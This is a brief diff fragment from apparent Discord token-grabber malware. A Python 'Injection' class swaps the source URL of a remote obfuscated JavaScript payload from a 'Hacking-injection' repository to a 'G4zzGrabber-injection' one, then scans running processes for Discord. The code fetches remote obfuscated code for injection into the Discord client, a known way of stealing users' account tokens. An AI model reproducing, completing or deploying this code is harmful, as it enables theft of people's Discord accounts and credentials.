@@ -22,7 +22,7 @@ class Injection:
         
         
         
-content.com/g4zzlove/Hacking-injection/main/obfuscated.js').text
+content.com/g4zzlove/G4zzGrabber-injection/main/obfuscated.js').text
         
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
